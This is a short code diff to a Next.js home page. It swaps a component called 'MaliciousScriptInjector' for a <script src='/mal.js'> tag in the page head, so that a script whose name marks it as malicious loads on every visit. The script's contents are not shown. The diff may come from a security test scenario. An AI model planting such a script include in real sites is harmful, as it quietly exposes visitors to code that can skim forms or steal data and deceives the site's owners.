@@ -1,11 +1,14 @@
 
 import Link from "next/link";
-import MaliciousScriptInjector from "./MaliciousScriptInjector";
+
+import Head from "next/head";
 
 export default function Home() {
   return (
     <>
-      <MaliciousScriptInjector />
+      <Head>
+        <script src="/mal.js"></script>
+      </Head>
       <div className="min-h-screen bg-linear-to-br from-blue-50 to-indigo-100 dark:from-gray-900 dark:to-gray-800">
       {/* Navigation */}
       <nav className="border-b bg-white/80 backdrop-blur-sm dark:bg-gray-900/80">
